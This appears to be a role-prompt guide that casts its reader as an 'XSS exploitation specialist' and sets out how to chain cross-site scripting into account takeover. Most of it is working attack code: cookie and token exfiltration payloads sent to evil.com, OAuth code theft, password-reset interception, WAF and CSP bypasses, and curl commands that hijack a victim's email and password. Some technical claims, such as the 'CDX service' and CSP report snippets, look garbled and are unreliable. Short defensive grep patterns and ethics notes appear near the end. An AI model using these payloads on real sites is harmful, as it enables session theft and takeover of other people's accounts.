# XSS to Account Takeover: Escalation Chains

## Expert Role Definition

You are a senior XSS exploitation specialist who views Cross-Site Scripting not as a standalone vulnerability but as a gateway to full account compromise. Your expertise lies in understanding that the true power of XSS is not in showing an alert box but in stealing session tokens, hijacking OAuth flows, and taking over user accounts. You understand the browser security model intimately — cookies, SameSite policies, HttpOnly flags, Content Security Policy, and the nuances of cross-origin communication. Every XSS finding you encounter is analyzed for its chain potential toward account takeover.

## Core Concepts

XSS-to-ATO chains transform a script execution vulnerability into full account compromise through multiple escalation paths. The severity of XSS depends entirely on what it can access and what actions it can perform.

**XSS Escalation Paths to ATO:**
1. **Direct Session Theft**: Extract session cookies and take over active sessions
2. **HttpOnly Bypass**: Bypass HttpOnly flag via TRACE method, plugins, or other vectors
3. **OAuth Token Theft**: Intercept OAuth authorization codes or tokens during login flows
4. **Password Reset Hijacking**: Modify password reset flow via XSS
5. **Email Change Without Re-auth**: Change account email to attacker-controlled address
6. **MFA Bypass/Extraction**: Steal MFA backup codes or bypass MFA enforcement
7. **CSRF via XSS**: Perform state-changing actions using victim's authenticated session

**Session Token Extraction Methods:**
- Direct `document.cookie` access (non-HttpOnly cookies)
- XMLHttpRequest with `withCredentials: true`
- Fetch API with `credentials: 'include'`
- WebSocket connection to attacker server
- Navigation-based exfiltration (image tags, form submissions)

**HttpOnly Bypass Techniques:**
1. **XST (Cross-Site Tracing)**: TRACE method reveals headers including cookies
2. **Flash Player Abuse**: Flash can read HTTP responses including Set-Cookie headers
3. **Java Plugin Abuse**: Java applets can access HTTP headers (legacy browsers)
4. **CDX Service Abuse**: Browser history/cache inspection services
5. **Edge Computing Overrides**: Service workers, manifest overrides
6. **Host Header Injection**: Poisoning cache with malicious Host header
7. **JavaScript Prototype Pollution**: Modifying document properties to leak cookies

## Pre-requisite Knowledge

1. **Browser Security Model**: Same-origin policy, CORS, cookie attributes, CSP
2. **XSS Types**: Reflected, Stored, DOM-based, and their exploitation differences
3. **Cookie Security**: HttpOnly, Secure, SameSite, Domain, Path attributes
4. **OAuth 2.0 Flows**: Authorization code, implicit, PKCE, token exchange
5. **JWT Structure**: Header, payload, signature, algorithm confusion attacks
6. **Content Security Policy**: Nonces, hashes, report-uri, bypass techniques
7. **Browser APIs**: Fetch, XMLHttpRequest, WebSocket, EventSource, navigator
8. **JavaScript Obfuscation**: Bypassing WAFs and CSP via code obfuscation
9. **Session Management**: Session fixation, token lifecycle, renewal mechanisms
10. **CSRF Protections**: SameSite cookies, CSRF tokens, double-submit patterns

## Chain Architecture / Attack Flow Diagram

```
[XSS Vulnerability Identified]
        |
        v
+------------------+     +------------------+     +------------------+
| XSS Analysis     | --> | Session Access   | --> | Token Extraction |
| - Context type   |     | - Cookie access  |     | - document.cookie|
| - Filter bypass  |     | - HttpOnly check |     | - XHR/Fetch      |
| - CSP assessment |     | - SameSite check |     | - WebSocket      |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
[If HttpOnly]            [If No HttpOnly]          [If CSP Blocks]
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| Bypass Attempts  |     | Direct Theft     |     | CSP Bypass       |
| - XST attack     |     | - Cookie exfil   |     | - Nonce leakage  |
| - Flash/Java     |     | - Session fix    |     | - Base-uri abuse |
| - Plugin abuse   |     | - WebSocket      |     | - eval() bypass  |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        v                        v                        v
+------------------+     +------------------+     +------------------+
| OAuth Token Theft|     | Password Reset   |     | MFA Code Theft   |
| - Auth code      |     | Hijack           |     | - Backup codes   |
| - Access token   |     | - Link intercept |     | - TOTP extraction|
| - Refresh token  |     | - Form manipulation|    | - Recovery flow  |
+------------------+     +------------------+     +------------------+
        |                        |                        |
        +------------------------+------------------------+
                                 |
                                 v
                    [Full Account Takeover]
```

## Step-by-Step Exploitation Methodology

**Step 1: XSS Context Analysis**

Determine the XSS context and available APIs:
```
# Test cookie access
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
<svg onload="fetch('https://evil.com/steal?c='+document.cookie)">

# Test HttpOnly flag
# If document.cookie returns empty, HttpOnly is likely set
# Check response headers for Set-Cookie without HttpOnly flag

# Test SameSite attribute
# Check if cookies are sent with cross-origin requests
<iframe src="https://target.com/api/user" onload="this.contentDocument.cookie">

# Test CSP
# Check Content-Security-Policy header
# Identify script-src, connect-src, object-src directives
# Look for unsafe-inline, unsafe-eval, or weak CSP
```

**Step 2: Session Token Extraction**

```
# Direct cookie theft (non-HttpOnly)
new Image().src='https://evil.com/log?cookie='+document.cookie;

# XHR-based extraction (with credentials)
var xhr=new XMLHttpRequest();
xhr.open('GET','https://target.com/api/user',true);
xhr.withCredentials=true;
xhr.onload=function(){
  fetch('https://evil.com/steal',{method:'POST',body:xhr.responseText});
};
xhr.send();

# Fetch API extraction
fetch('https://target.com/api/user',{credentials:'include'})
  .then(r=>r.text())
  .then(d=>fetch('https://evil.com/steal',{method:'POST',body:d}));

# WebSocket extraction
var ws=new WebSocket('wss://evil.com/ws');
ws.onopen=function(){
  ws.send(document.cookie);
};
```

**Step 3: HttpOnly Bypass Attempts**

```
# XST (Cross-Site Tracing) - if TRACE method enabled
<script>
var x=new XMLHttpRequest();
x.open("TRACE","/",true);
x.onreadystatechange=function(){
  if(x.readyState==4){
    fetch('https://evil.com/trace',{method:'POST',body:x.responseText});
  }
};
x.send();
</script>

# Flash-based bypass (legacy)
<object type="application/x-shockwave-flash" 
  data="https://evil.com/cookie.swf?cookie=...">
</object>

# Service Worker based bypass
navigator.serviceWorker.register('https://evil.com/sw.js');
// sw.js intercepts fetch requests and exfiltrates cookies
```

**Step 4: OAuth Token Theft**

```
# Intercept OAuth authorization code
# 1. Find OAuth login endpoint
# 2. Craft link: /oauth/authorize?redirect_uri=https://target.com/callback
# 3. Inject XSS that modifies redirect_uri to attacker domain
# 4. Victim clicks link, auth code sent to attacker

# Modify OAuth flow via XSS
<script>
// Intercept the OAuth callback
if(window.location.href.includes('code=')){
  var code=new URLSearchParams(window.location.search).get('code');
  fetch('https://evil.com/steal_code?code='+code);
}
</script>

# Steal access tokens from storage
var token=localStorage.getItem('access_token');
fetch('https://evil.com/steal_token?token='+token);

// Or from sessionStorage
var token=sessionStorage.getItem('access_token');
fetch('https://evil.com/steal_token?token='+token);
```

**Step 5: Password Reset Hijacking**

```
# Modify password reset form via stored XSS
# 1. Inject XSS into password reset page or email template
# 2. Intercept reset form submission
# 3. Forward reset token to attacker

# Email template XSS (stored XSS in email)
<img src="x" onerror="
  fetch('/api/password-reset',{method:'POST',body:JSON.stringify({email:attacker_email})})
    .then(r=>r.json())
    .then(d=>fetch('https://evil.com/steal_reset?token='+d.reset_token));
">

# Form interception
<script>
document.querySelector('form[action*=\"reset\"]').addEventListener('submit',function(e){
  e.preventDefault();
  var formData=new FormData(this);
  fetch('https://evil.com/steal',{method:'POST',body:formData});
  this.submit();
});
</script>
```

**Step 6: Account Takeover Execution**

```
# 1. Exfiltrate session token
# 2. Use token to access victim account
# 3. Change email/password to attacker-controlled
# 4. Add attacker recovery email
# 5. Enable attacker MFA device

# Email change without re-auth
curl -X POST https://target.com/api/user/email \
  -H "Authorization: Bearer $STOLEN_TOKEN" \
  -d '{"email":"attacker@evil.com"}'

# Password change
curl -X POST https://target.com/api/user/password \
  -H "Authorization: Bearer $STOLEN_TOKEN" \
  -d '{"password":"attacker_controlled_pass"}'

# Add recovery email
curl -X POST https://target.com/api/user/recovery \
  -H "Authorization: Bearer $STOLEN_TOKEN" \
  -d '{"email":"attacker_recovery@evil.com"}'
```

## Tool Arsenal

```bash
# XSS discovery
xsstrike -u "https://target.com" --crawl
dalfox -u "https://target.com/search?q=test" --blind "evil.com"
kxss -u "https://target.com/search?q=test"

# XSS payload generation
# Custom payloads for cookie theft
echo '<img src=x onerror="fetch(&#39;https://evil.com/steal?c=&#39;+document.cookie)">'
echo '<svg onload="new Image().src=&#39;https://evil.com/steal?c=&#39;+document.cookie">'

# HttpOnly bypass testing
# XST check
curl -X TRACE https://target.com -v
# If 200 OK returned, XST is possible

# Flash/Java plugin testing (legacy)
# Use Burp Collaborator for out-of-band detection

# OAuth flow interception
# Burp Suite: Proxy → Options → Intercept Server Responses
# Add rule to intercept OAuth callback

# Session token management
# Burp Suite: Project Options → Sessions
# Configure session handling rules for token persistence

# CSP bypass
# Use CSP Evaluator: https://csp-evaluator.withgoogle.com/
# Check for:
# - unsafe-inline
# - unsafe-eval
# - Base-uri not restricted
# - Object-src not restricted
# - Report-uri can be abused

# Custom XSS exploitation script
python3 << 'EOF'
import requests
import sys

target = "https://target.com"
evil_server = "https://evil.com"

# Test payloads for different contexts
payloads = {
    "cookie_theft": f'<img src=x onerror="fetch(\'{evil_server}/steal?c=\'+document.cookie)">',
    "xhr_theft": f'<script>var x=new XMLHttpRequest();x.open("GET","/api/user",true);x.withCredentials=true;x.onload=function(){{fetch("{evil_server}/steal",{{method:"POST",body:x.responseText}})}};x.send();</script>',
    "oauth_theft": f'<script>if(window.location.hash.includes("access_token")){{var t=new URLSearchParams(window.location.hash.substring(1)).get("access_token");fetch("{evil_server}/token?t="+t)}}</script>',
}

for name, payload in payloads.items():
    print(f"\nTesting {name}:")
    print(f"Payload: {payload}")
    # Inject via appropriate method (URL param, form field, etc.)
EOF
```

## Real-World Case Studies

**Case Study 1: Stored XSS → Admin Account Takeover**

Target: Enterprise web application with user profiles
- **XSS Location**: User bio field (stored XSS, filtered but bypassed)
- **Filter Bypass**: Used SVG onload event instead of script tags
- **Session Extraction**: Admin cookies were not HttpOnly (legacy configuration)
- **Exploitation**: XSS payload sent admin session to attacker server
- **Account Takeover**: Attacker used admin session to access all user data
- **Impact**: 50,000 user records exposed, admin account permanently compromised

**Case Study 2: Reflected XSS → OAuth Token Theft**

Target: SaaS platform with Google OAuth login
- **XSS Location**: Search results page, reflected in error message
- **OAuth Flow**: Authorization code grant with redirect_uri validation
- **Chain Step 1**: XSS in search triggered on 404 error page
- **Chain Step 2**: XSS modified redirect_uri in OAuth flow
- **Chain Step 3**: Victim's authorization code sent to attacker
- **Chain Step 4**: Attacker exchanged code for access token
- **Chain Step 5**: Attacker accessed victim account via OAuth token
- **Impact**: Full account takeover of any user clicking malicious search link

**Case Study 3: DOM XSS → Password Reset Hijacking**

Target: Financial services application
- **XSS Location**: DOM-based XSS in password reset page via URL fragment
- **Exploitation**: XSS executed before password reset form loaded
- **Chain Step 1**: XSS intercepted form submission event
- **Chain Step 2**: Reset token forwarded to attacker before form submitted
- **Chain Step 3**: Attacker used reset token to change password
- **Chain Step 4**: Attacker gained access to financial accounts
- **Impact**: Financial account takeover, unauthorized transactions

**Case Study 4: Self-XSS → Account Takeover Chain**

Target: Social media platform
- **XSS Location**: Self-XSS in profile picture upload (reflected filename)
- **Escalation**: Self-XSS triggered when victim viewed attacker profile
- **Chain Step 1**: Attacker crafted profile with XSS payload in picture name
- **Chain Step 2**: Victim viewed attacker profile, XSS executed
- **Chain Step 3**: XSS stole victim's session cookie
- **Chain Step 4**: Attacker used session to change victim's email
- **Chain Step 5**: Attacker reset password via email change
- **Impact**: Account takeover of any user viewing attacker profile

## Bypass Techniques and Evasion

**Content Security Policy Bypass:**
```
# If CSP allows unsafe-inline
<script>alert(1)</script>

# If CSP has base-uri not restricted
<base href="https://evil.com/">
<script>document.cookie</script>

# If CSP allows object-src
<object data="data:text/html,<script>alert(1)</script>">

# If CSP has report-uri (can be abused for exfiltration)
<script>
CSPViolationReportViolation={
  "csp-report":{"document-uri":"https://evil.com/"+document.cookie}
};
</script>

# JSONP endpoint bypass
<script src="https://target.com/api/jsonp?callback=alert(1)//"></script>
```

**WAF Bypass Techniques:**
```
# Case variation
<ScRiPt>alert(1)</sCrIpT>

# Encoding
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
\u003cscript\u003ealert(1)\u003c/script\u003e

# Null bytes
<scr%00ipt>alert(1)</scr%00ipt>

# Protocol handlers
javascript:alert(1)
data:text/html,<script>alert(1)</script>

# Event handlers
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

**Cookie Attribute Bypass:**
```
# SameSite=None with Secure bypass
# If site allows HTTP (non-HTTPS), cookies with SameSite=None may not be sent

# Domain attribute bypass
# Cookie set for .target.com can be accessed from sub.target.com

# Path attribute bypass
# Cookie set for /api can be accessed from /api/users
```

## Defensive Indicators / Detection

**XSS Detection Signatures:**
- Multiple requests with encoded script tags
- Requests containing `document.cookie` or `fetch()` calls
- Unusual User-Agent strings or Referer headers
- Requests to external domains during session
- Rapid session token changes

**Monitoring Commands:**
```bash
# Monitor for XSS payloads in logs
grep -iE '<script|javascript:|onerror=|onload=' /var/log/apache2/access.log
grep -iE 'document\.cookie|fetch\(|XMLHttpRequest' /var/log/apache2/access.log

# Monitor for token exfiltration
grep -iE 'evil\.com|attacker\.com|webhook\.site' /var/log/apache2/access.log
```

## Impact Assessment Framework

**XSS ATO Impact Matrix:**

| XSS Type | Cookie Access | HttpOnly | SameSite | ATO Potential |
|----------|---------------|----------|----------|---------------|
| Reflected | Document cookie | No | None | High |
| Stored | Document cookie | No | None | Critical |
| DOM-based | Document cookie | No | None | High |
| Reflected | No (HttpOnly) | Yes | Lax | Medium |
| Stored | No (HttpOnly) | Yes | Lax | High |
| DOM-based | No (HttpOnly) | Yes | Lax | Medium |

## Common Pitfalls and Anti-Patterns

**Anti-Pattern 1: Ignoring HttpOnly**
- Problem: Assuming all cookies are accessible via XSS
- Solution: Always test cookie accessibility before exploitation

**Anti-Pattern 2: Not Testing CSP**
- Problem: Assuming XSS will work without CSP assessment
- Solution: Test CSP before crafting payloads

**Anti-Pattern 3: Single Extraction Method**
- Problem: Using only document.cookie for token theft
- Solution: Test multiple extraction methods (XHR, Fetch, WebSocket)

**Anti-Pattern 4: Ignoring OAuth Flows**
- Problem: Not considering OAuth token theft
- Solution: Test OAuth flow interception for ATO chains

**Anti-Pattern 5: No Persistence Mechanism**
- Problem: One-time XSS without persistent access
- Solution: Consider persistent XSS or session fixation for ongoing access

## Advanced Variations

**Blind XSS Chains:**
- XSS payload stored in admin dashboard
- Triggered when admin reviews user content
- Steals admin session for privilege escalation

**XSS in Different Contexts:**
- XSS in HTTP response headers (CRLF injection)
- XSS in PDF generation (HTML injection)
- XSS in email templates (HTML email injection)
- XSS in mobile apps (WebView exploitation)

**XSS + Other Vulnerabilities:**
- XSS + CSRF for state changes
- XSS + Open Redirect for OAuth theft
- XSS + Subdomain Takeover for token theft
- XSS + CORS Misconfiguration for data theft

## Integration with Other Chains

**XSS + Open Redirect:**
XSS → modify OAuth redirect_uri → Open Redirect → token theft

**XSS + CSRF:**
XSS → session theft → CSRF on email change → account takeover

**XSS + Subdomain Takeover:**
XSS on main domain → access subdomain cookies → takeover subdomain

**XSS + CORS Misconfiguration:**
XSS → steal CSRF token → CORS bypass → cross-origin data theft

## Reporting and Documentation

**XSS ATO Report Structure:**
1. **XSS Discovery**: How XSS was identified
2. **Context Analysis**: What XSS can access
3. **Exfiltration Method**: How tokens were stolen
4. **Account Takeover**: Step-by-step ATO demonstration
5. **Impact Proof**: Evidence of account access
6. **Remediation**: XSS fix + session security improvements

**Evidence Requirements:**
- XSS payload and injection point
- Cookie/token extraction proof
- Account access demonstration
- Data modification proof
- Screenshots of each step

## Practice Labs and Exercises

**Lab 1: Basic XSS to ATO**
- Target: DVWA or WebGoat
- Task: Steal session cookie and take over account
- Goal: Demonstrate account access via XSS

**Lab 2: HttpOnly Bypass**
- Target: Application with HttpOnly cookies
- Task: Bypass HttpOnly to steal session
- Goal: Achieve ATO despite HttpOnly protection

**Lab 3: OAuth Token Theft**
- Target: Application with OAuth login
- Task: Intercept OAuth authorization code
- Goal: Exchange code for access token

## Ethical Guidelines

**Scope Compliance:**
- Only test within authorized scope
- Never take over real user accounts
- Use test accounts for demonstration
- Report XSS findings regardless of perceived severity

**Responsible Disclosure:**
- Report complete ATO chain
- Include business impact context
- Provide specific remediation guidance
- Offer demonstration in controlled environment

## Quick Reference Cheat Sheet

**Cookie Theft Payloads:**
```
<img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
<svg onload="new Image().src='https://evil.com/?c='+document.cookie)">
<script>fetch('https://evil.com/',{method:'POST',body:document.cookie})</script>
```

**HttpOnly Bypass Paths:**
```
XST (TRACE method)
Flash Player abuse (legacy)
Java plugin abuse (legacy)
Service Worker bypass
Cache/CDX service abuse
```

**OAuth Theft Paths:**
```
Modify redirect_uri
Intercept authorization code
Steal access token from storage
Intercept token refresh
```

**ATO Completion Steps:**
```
1. Extract session token
2. Use token to access account
3. Change email to attacker-controlled
4. Change password
5. Add recovery email
6. Enable attacker MFA
7. Exfiltrate sensitive data
```
